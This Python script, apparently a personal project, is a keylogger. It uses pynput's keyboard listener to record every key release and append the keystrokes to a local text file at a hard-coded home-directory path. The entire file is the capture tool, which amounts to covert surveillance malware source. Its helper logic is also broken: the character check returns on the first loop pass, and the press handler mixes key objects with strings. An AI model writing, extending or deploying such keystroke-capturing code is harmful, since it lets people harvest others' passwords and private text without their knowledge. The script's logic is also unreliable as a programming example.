import os
import sys
from pynput import keyboard

# Checks for "Key." keys
def ispecial(value):
    if "Key." in value:
        return True

    else:
        return False


# defines letters
def nospecial(value):
    # universal variables for alphabet letters
    alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'

    char = '~`!1@2#3$4%5^6&7*8(9)0_-+={[}]|\:;"<,>.?\'/'

    # iterates through alphabet to compare 'value' and returns either True or False
    for letter in alphabet:
        for character in char:
            if value == letter or value == character:
                return True

            else:
                return False


# define 'write' for when key is released
def write(key):

    # define value that stores strokes
    keydata = str(key)

    # With file open with reading and writing permissions write and close the 'keydata' as sting characters
    with open('/home/l3phant/PycharmProjects/Ckeylogger/Datat.txt', 'a') as file:
        if nospecial(keydata) == False or "Key.shift" in keydata:
            file.write(keydata)

        if ispecial(keydata) == True and keydata != "Key.shift":
            file.write("\n")

    file.close()


# function when key is pressed uses the "is_letter" function to compare characters
def on_press(key):
    if nospecial(key) == True:
        print("{0}".format(key.char))

    if nospecial(key) == False:
            print("{0}".format(''))


# Using Listener, everytime on_press is activated function write activates
# This also joins the characters
with keyboard.Listener(on_press=on_press, on_release=write) as listener:
    listener.join()
    